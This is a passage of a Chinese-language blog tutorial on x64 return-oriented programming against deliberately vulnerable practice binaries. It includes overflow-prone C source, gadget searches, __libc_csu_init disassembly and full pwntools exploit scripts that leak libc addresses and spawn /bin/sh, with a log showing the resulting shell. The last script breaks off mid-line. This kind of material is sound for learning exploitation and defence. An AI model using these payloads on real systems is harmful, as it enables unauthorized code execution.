class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;dlfcn.h></span></span><span class="token keyword">void</span> <span class="token function">systemaddr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">void</span><span class="token operator">*</span> handle <span class="token operator">=</span> <span class="token function">dlopen</span><span class="token punctuation">(</span><span class="token string">"libc.so.6"</span><span class="token punctuation">,</span> RTLD_LAZY<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\n"</span><span class="token punctuation">,</span><span class="token function">dlsym</span><span class="token punctuation">(</span>handle<span class="token punctuation">,</span><span class="token string">"system"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">vulnerable_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">128</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span>STDIN_FILENO<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> argv<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">systemaddr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"Hello, World\n"</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">vulnerable_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>同样关闭stack  pie  还有因为用到了dlopen，dlsym函数要加上-ldl</p><pre class=" language-bash"><code class="language-bash">gcc -fno-stack-protector -no-pie level4.c -o level4 -ldl</code></pre><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>这个程序会输出system地址那么在本地找到libc.so.6就可以计算出/bin/sh地址，再由vulnerable处的栈溢出控制程序执行system函数即可，但问题是X64函数的前6个参数依次放在对应寄存器中，对于system函数它只有一个参数（/bin/sh）那么就应该放在rdi里面。我们可以控制的只有栈中的数据，想让栈中的/bin/sh地址放到rdi中就得需要pop rdi 指令。<br>所以用ROPgadgates寻找这个指令。</p><pre class=" language-bash"><code class="language-bash">hunter@hunter:~/PWN/rop/蒸米rop/x64$ ROPgadget --binary level4 --only <span class="token string">'pop|ret'</span>Gadgets information<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>0x00000000004006d2 <span class="token keyword">:</span> pop rbp <span class="token punctuation">;</span> ret0x00000000004006d1 <span class="token keyword">:</span> pop rbx <span class="token punctuation">;</span> pop rbp <span class="token punctuation">;</span> ret0x0000000000400585 <span class="token keyword">:</span> ret0x0000000000400735 <span class="token keyword">:</span> ret 0xbdb8Unique gadgets found: 4</code></pre><p><strong>对level4文件搜寻没有看到，那么就对libc文件搜寻（本地提前准备好libc文件）</strong></p><pre class=" language-bash"><code class="language-bash">hunter@hunter:~/PWN/rop/蒸米rop/x64$ ROPgadget --binary libc.so.6 --only <span class="token string">'pop|ret'</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">'rdi'</span>0x00000000000221a3 <span class="token keyword">:</span> pop rdi <span class="token punctuation">;</span> pop rbp <span class="token punctuation">;</span> ret0x000000000002155f <span class="token keyword">:</span> pop rdi <span class="token punctuation">;</span> ret0x000000000005b4fd <span class="token keyword">:</span> pop rdi <span class="token punctuation">;</span> ret 0x38</code></pre><p>找到一个：0x000000000002155f : pop rdi ; ret 。<br><strong>需要注意的是这个和在libc文件中找system，/bin/sh一样这个是偏移量，但我们不慌，知道system绝对地址就可以算出pop rid的地址.</strong></p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc.so.6'</span><span class="token punctuation">)</span>binsh_offset <span class="token operator">=</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">#0x000000000002155f : pop rdi ; ret</span>pop_ret_offset <span class="token operator">=</span> <span class="token number">0x000000000002155f</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./level4'</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"##########get system########"</span>system_addr <span class="token operator">=</span> int<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"##########the system########"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>binsh_addr <span class="token operator">=</span> system_addr <span class="token operator">+</span> binsh_offset<span class="token keyword">print</span> <span class="token string">"##########the binsh########"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span>pop_ret_addr <span class="token operator">=</span> system_addr <span class="token operator">+</span> pop_ret_offset<span class="token keyword">print</span> <span class="token string">"##########the pop rdi ret########"</span> <span class="token operator">+</span>str<span class="token punctuation">(</span>pop_ret_addr<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#0x0000000000400585 : ret</span>payload1 <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">136</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000400585</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_ret_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#0x000000000012188b : pop rax ; pop rdi ; call rax</span>ppc_offset <span class="token operator">=</span> <span class="token number">0x000000000012188b</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>ppc_addr <span class="token operator">=</span> ppc_offset <span class="token operator">+</span> system_addrpayload2 <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">136</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span>ppc_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>注意到，我的payload有两个都可行。payload1 就是我们首先想到的思路，还放了一个p64(0x0000000000400585)，没错在执行system函数遇到了堆栈不平衡（日了狗了）<br>payload2 <strong>是想到了call指令来执行system函数（call 要放got地址）。pop rax 将system地址放入rax ，pop rdi将参数/bin/sh地址放入rdi，call rax：执行！（没有遇到堆栈步平衡问题，感觉以后可以多用call）</strong></p><h3 id="本地测试结果"><a href="#本地测试结果" class="headerlink" title="本地测试结果"></a>本地测试结果</h3><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received 0x1c bytes:    <span class="token string">'0x7ffff782f440\n'</span>    <span class="token string">'Hello, World\n'</span><span class="token comment" spellcheck="true">##########the system########140737345942592</span><span class="token comment" spellcheck="true">##########the binsh########140737347403418</span><span class="token comment" spellcheck="true">##########the pop rdi ret########140737345754463</span><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent 0xa1 bytes:    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│    *    00000080  41 41 41 41  41 41 41 41  8b 18 90 f7  ff 7f 00 00  │AAAA│AAAA│····│····│    00000090  40 f4 82 f7  ff 7f 00 00  9a 3e 99 f7  ff 7f 00 00  │@···│····│·<span class="token operator">></span>··│····│    000000a0  0a                                                  │·│    000000a1<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Switching to interactive mode$ <span class="token function">whoami</span><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent 0x7 bytes:    <span class="token string">'whoami\n'</span><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received 0x7 bytes:    <span class="token string">'hunter\n'</span>hunter$  </code></pre><h2 id="4：level5–通用gadgets"><a href="#4：level5–通用gadgets" class="headerlink" title="4：level5–通用gadgets"></a>4：level5–通用gadgets</h2><p><strong>因为程序在编译过程中会加入一些通用函数用来进行初始化操作（比如加载libc.so的初始化函数），所以虽然很多程序的源码不同，但是初始化的过程是相同的，因此针对这些初始化函数，我们可以提取一些通用的gadgets加以使用，从而达到我们想要达到的效果。</strong></p><p>level3和level4的程序都留了一些辅助函数在程序中，这次我们将这些辅助函数去掉再来挑战一下。目标程序level5.c如下：</p><h3 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token keyword">void</span> <span class="token function">vulnerable_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">128</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span>STDIN_FILENO<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> argv<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> <span class="token string">"Hello, World\n"</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">vulnerable_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>没错你只有read和write函数和蒸米X86的level3 是一样的</p><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>可以看到这个程序仅仅只有一个buffer overflow，也没有任何的辅助函数可以使用，所以我们要先想办法泄露内存信息，找到system()的值，然后再传递“/bin/sh”到.bss段, 最后调用system(“/bin/sh”)。<br>因为原程序使用了write()和read()函数，我们可以通过write()去输出write.got的地址，从而计算出libc.so在内存中的地址。但问题在于write()的参数应该如何传递，因为x64下前6个参数不是保存在栈中，而是通过寄存器传值。<br>我们使用ROPgadget并没有找到类似于pop rdi, ret,pop rsi, ret这样的gadgets。那应该怎么办呢？<strong>其实在x64下有一些万能的gadgets可以利用。比如说我们用objdump -d -Mintel level5观察一下__libc_csu_init()这个函数。</strong><br><strong>一般来说，只要程序调用了libc.so，程序都会有这个函数用来对libc进行初始化操作。</strong></p><pre class=" language-bash"><code class="language-bash">00000000004005a0 <span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">></span>:  4005a0:    48 89 6c 24 d8           mov    QWORD PTR <span class="token punctuation">[</span>rsp-0x28<span class="token punctuation">]</span>,rbp  4005a5:    4c 89 64 24 e0           mov    QWORD PTR <span class="token punctuation">[</span>rsp-0x20<span class="token punctuation">]</span>,r12  4005aa:    48 8d 2d 73 08 20 00     lea    rbp,<span class="token punctuation">[</span>rip+0x200873<span class="token punctuation">]</span>        <span class="token comment" spellcheck="true"># 600e24 &lt;__init_array_end></span>  4005b1:    4c 8d 25 6c 08 20 00     lea    r12,<span class="token punctuation">[</span>rip+0x20086c<span class="token punctuation">]</span>        <span class="token comment" spellcheck="true"># 600e24 &lt;__init_array_end></span>  4005b8:    4c 89 6c 24 e8           mov    QWORD PTR <span class="token punctuation">[</span>rsp-0x18<span class="token punctuation">]</span>,r13  4005bd:    4c 89 74 24 f0           mov    QWORD PTR <span class="token punctuation">[</span>rsp-0x10<span class="token punctuation">]</span>,r14  4005c2:    4c 89 7c 24 f8           mov    QWORD PTR <span class="token punctuation">[</span>rsp-0x8<span class="token punctuation">]</span>,r15  4005c7:    48 89 5c 24 d0           mov    QWORD PTR <span class="token punctuation">[</span>rsp-0x30<span class="token punctuation">]</span>,rbx  4005cc:    48 83 ec 38              sub    rsp,0x38  4005d0:    4c 29 e5                 sub    rbp,r12  4005d3:    41 89 fd                 mov    r13d,edi  4005d6:    49 89 f6                 mov    r14,rsi  4005d9:    48 c1 fd 03              sar    rbp,0x3  4005dd:    49 89 d7                 mov    r15,rdx  4005e0:    e8 1b fe ff ff           call   400400 <span class="token operator">&lt;</span>_init<span class="token operator">></span>  4005e5:    48 85 ed                 <span class="token function">test</span>   rbp,rbp  4005e8:    74 1c                    je     400606 <span class="token operator">&lt;</span>__libc_csu_init+0x66<span class="token operator">></span>  4005ea:    31 db                    xor    ebx,ebx  4005ec:    0f 1f 40 00              nop    DWORD PTR <span class="token punctuation">[</span>rax+0x0<span class="token punctuation">]</span>  4005f0:    4c 89 fa                 mov    rdx,r15              <span class="token comment" spellcheck="true">#关注点</span>  4005f3:    4c 89 f6                 mov    rsi,r14  4005f6:    44 89 ef                 mov    edi,r13d  4005f9:    41 ff 14 <span class="token function">dc</span>              call   QWORD PTR <span class="token punctuation">[</span>r12+rbx*8<span class="token punctuation">]</span>  4005fd:    48 83 c3 01              add    rbx,0x1  400601:    48 39 eb                 <span class="token function">cmp</span>    rbx,rbp  400604:    75 ea                    jne    4005f0 <span class="token operator">&lt;</span>__libc_csu_init+0x50<span class="token operator">></span>  400606:    48 8b 5c 24 08           mov    rbx,QWORD PTR <span class="token punctuation">[</span>rsp+0x8<span class="token punctuation">]</span>     <span class="token comment" spellcheck="true">#关注点从rsp+8开始读取栈中数据</span>  40060b:    48 8b 6c 24 10           mov    rbp,QWORD PTR <span class="token punctuation">[</span>rsp+0x10<span class="token punctuation">]</span>  400610:    4c 8b 64 24 18           mov    r12,QWORD PTR <span class="token punctuation">[</span>rsp+0x18<span class="token punctuation">]</span>  400615:    4c 8b 6c 24 20           mov    r13,QWORD PTR <span class="token punctuation">[</span>rsp+0x20<span class="token punctuation">]</span>  40061a:    4c 8b 74 24 28           mov    r14,QWORD PTR <span class="token punctuation">[</span>rsp+0x28<span class="token punctuation">]</span>  40061f:    4c 8b 7c 24 30           mov    r15,QWORD PTR <span class="token punctuation">[</span>rsp+0x30<span class="token punctuation">]</span>  400624:    48 83 c4 38              add    rsp,0x38  400628:    c3                       ret      400629:    0f 1f 80 00 00 00 00     nop    DWORD PTR <span class="token punctuation">[</span>rax+0x0<span class="token punctuation">]</span></code></pre><p>** 从4005f0开始：**<br>    1 r15=&gt;rdx,r14=&gt;rsi ,r13d=&gt;edi<br>    2 call指令我们可以利用，即将rbx弄成0，r12放目标函数got地址<br>    3 因为要执行上面rbx会变成0，add指令后rbx=1<br>    4 cmp    rbx,rbp如果相等就不会执行jne所以要把rbp设为1<br>    5 然后是6个mov将从rsp+8开始把栈中数据放入，rbx，rbp，r12，r13，r14，r15<br>    6 rsp往高地址移动0x38（56）字节即移动7次<br>    7 ret用来控制跳转到4005f0目的是执行r12中的函数<br><strong>所以先用栈溢出将程序跳到400606读取我们构造的payload最后ret到4005f0来执行r12中的函数，因为程序会继续往下走再次ret我们可以控制跳转到main函数，准备下一次攻击。</strong></p><h3 id="payload1"><a href="#payload1" class="headerlink" title="payload1"></a>payload1</h3><p>我们先构造payload1，利用write()输出write在内存中的地址。</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#rdx=r15,rsi=r14,rdi=edi=r13d,r12=write_got,rbx=0,rbp=1 ret=0x4005f0  ##注释在这种长exp显得尤为重要</span><span class="token comment" spellcheck="true">#write(rdi=1,rsi=write_got,rdx=8)</span>payload1 <span class="token operator">=</span>  <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">136</span>   <span class="token comment" spellcheck="true">#NULL</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x400606</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>got_write<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>got_write<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># </span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x4005F0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]</span>payload1 <span class="token operator">+=</span> <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">56</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span></code></pre><h3 id="payload2"><a href="#payload2" class="headerlink" title="payload2"></a>payload2</h3><p>用read()将system()的地址以及“/bin/sh”读入到.bss段内存中。bss可用readelf -S level5获取</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#rdx=r15,rsi=r14,rdi=edi=r13d,r12=read_got,rbx=0,rbp=1 ret=0x4005f0</span><span class="token comment" spellcheck="true">#read(rdi=0,rsi=bss_addr,rdx=16)  16字节是读取system的地址还有字符串/bin/sh\x00</span>payload2 <span class="token operator">=</span>  <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">136</span>payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x400606</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>got_read<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span> payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x4005F0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]</span>payload2 <span class="token operator">+=</span> <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">56</span>payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span></code></pre><h3 id="payload3"><a href="#payload3" class="headerlink" title="payload3"></a>payload3</h3><p>最后我们构造payload3,调用system()函数执行“/bin/sh”。注意，system()的地址保存在了.bss段首地址上，“/bin/sh\x00”保存在了.bss段首地址+8字节上。</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#rdx=r15,rsi=r14,rdi=edi=r13d,r12=bss_addr,rbx=0,rbp=1 ret=0x4005f0</span><span class="token comment" spellcheck="true">#system(rdi=bss_addr + 8) rsi=0 rdx=0</span>payload3 <span class="token operator">=</span>  <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">136</span>payload3 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x400606</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_addr<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> payload3 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x4005F0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]</span>payload3 <span class="token operator">+=</span> <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">56</span>payload3 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span></code></pre><h3 id="EXP（蒸米）"><a href="#EXP（蒸米）" class="headerlink" title="EXP（蒸米）"></a>EXP（蒸米）</h3><p>我本地测试遇到太多玄学问题了（很操蛋）</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'level5'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc.so.6'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./level5'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#p = remote('127.0.0.1',10001)</span>got_write <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token string">"got_write: "</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>got_write<span class="token punctuation">)</span>got_read <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token string">"got_read: "</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>got_read<span class="token punctuation">)</span>main <span class="token operator">=</span> <span class="token number">0x400564</span>off_system_addr <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token string">"off_system_addr: "</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>off_system_addr<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#rdi=  edi = r13,  rsi = r14, rdx = r15 </span><span class="token comment" spellcheck="true">#write(rdi=1, rsi=write.got, rdx=4)</span>payload1 <span class="token operator">=</span>  <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">136</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x400606</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>got_write<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>got_write<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop_junk_rbx_rbp_r12_r13_r14_r15_ret</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x4005F0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]</span>payload1 <span class="token operator">+=</span> <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">56</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Hello, World\n"</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"\n#############sending payload1#############\n"</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>write_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"write_addr: "</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>write_addr<span class="token punctuation">)</span>system_addr <span class="token operator">=</span> write_addr <span class="token operator">-</span> off_system_addr<span class="token keyword">print</span> <span class="token string">"system_addr: "</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>bss_addr<span class="token operator">=</span><span class="token number">0x601028</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Hello, World\n"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#rdi=  edi = r13,  rsi = r14, rdx = r15 </span><span class="token comment" spellcheck="true">#read(rdi=0, rsi=bss_addr, rdx=16)</span>payload2 <span class="token operator">=</span>  <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">136</span>payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x400606</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>got_read<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop_junk_rbx_rbp_r12_r13_r14_r15_ret</span>payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x4005F0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]</span>payload2 <span class="token operator">+=</span> <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">56</span>payload2 <span class="token 